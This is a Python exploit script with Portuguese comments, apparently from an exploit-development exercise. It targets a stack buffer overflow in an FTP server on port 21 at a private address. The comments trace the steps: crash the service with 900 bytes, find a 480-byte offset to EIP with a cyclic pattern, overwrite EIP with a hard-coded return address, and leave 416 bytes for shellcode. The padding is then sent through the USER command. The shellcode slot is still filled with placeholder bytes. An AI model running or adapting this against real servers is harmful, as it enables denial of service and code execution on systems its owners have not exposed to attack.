#!/usr/bin/python

import socket

#define o buffer enviado
#buf = 'A' * 900

#string buf com 900 bytes
#buf = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9'

#string buf para validar o controle de EIP sendo que sao 480 bytes para chegar em EIP, 4 bytes para manipular EIP e a diferenca entre os 900 bytes do estouro da pilha seria os 900 bytes de estouro da pilha menos os 480 bytes para chegar em EIO e 4 bytes para sobrescrevelo, onde esssa diferenca sera usada para inserir o shell code
#resumindo
#900 bytes crash da aplicacao
#480 bytes + 4 = Chegamos em EIP
#416 = para o shell code em ESP,EDI (JMP ESP)
#buf = 'A' * 480 + 'B' * 4 + 'C' * ( 900 - 484)

#Encontrando endereco de retorno
buf = 'A' * 480 + '\x4B\x77\xA6\x7C' + 'C' * ( 900 - 484)

#cria socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#conecta no socket na porta 21
s.connect(('192.168.0.62',21))

#pega a resposta
r = s.recv(1024)

print r

#Envia um usuario de teste mais o buffer para crash da aplicacao
s.send('USER teste' + buf + '\r\n')
r = s.recv(1024)
print r


#Fecha a conexao
s.close()
